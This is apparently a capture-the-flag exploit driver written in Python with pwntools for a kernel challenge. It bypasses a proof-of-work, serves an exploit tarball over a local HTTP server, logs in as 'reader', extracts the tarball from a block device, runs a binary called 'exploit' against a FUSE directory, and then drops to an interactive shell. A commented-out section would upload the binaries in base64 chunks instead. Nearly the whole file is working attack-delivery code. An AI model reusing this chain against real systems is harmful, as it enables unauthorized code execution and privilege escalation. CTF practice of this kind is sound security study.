#!/usr/bin/env python3
from pwn import *
from http.server import HTTPServer
import time
import base64
import os
import sys

context.log_level = 'DEBUG'

def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))

def run(cmd):
    p.sendlineafter("$ ", cmd.encode())
    p.recvline()

HOST, PORT = "127.0.0.1", 1337

r = process(['python3', '-m', 'http.server', '8888', '--directory', '/home/user/'])

p = remote(HOST, PORT)
# p = process("nc localhost 1337".split())

p.recvuntil('== proof-of-work: ')
if p.recvline().startswith(b'enabled'):
    handle_pow(p)

"""
run('cd /tmp')

with open("./exploit", "rb") as f:
    payload = base64.b64encode(f.read()).decode()

log.info("Uploading...")
for i in range(0, len(payload), 512):
    print(f"Uploading... {i:x} / {len(payload):x}")
    run('echo "{}" >> b64exp'.format(payload[i:i+512]))
run('base64 -d b64exp > exploit')
run('rm b64exp')
run('chmod +x exploit')


with open("./increment", "rb") as f:
    payload = base64.b64encode(f.read()).decode()

log.info("Uploading...")
for i in range(0, len(payload), 512):
    print(f"Uploading... {i:x} / {len(payload):x}")
    run('echo "{}" >> b64exp'.format(payload[i:i+512]))
run('base64 -d b64exp > increment')
run('rm b64exp')
run('chmod +x increment')
"""



URL = "http://localhost:8888/exploit.tar.gz"

p.sendlineafter(b"skip): ", URL)

p.sendlineafter("login: ", "reader")
p.sendlineafter("Password: ", "reader")

r.close()

run("cp /dev/sdc /tmp/exploit.tar.gz")
run("cd /tmp")
run("tar xzf exploit.tar.gz")
run("chmod +x ./exploit ./increment")
run("./exploit /tmp/fuse_dir")

p.interactive()
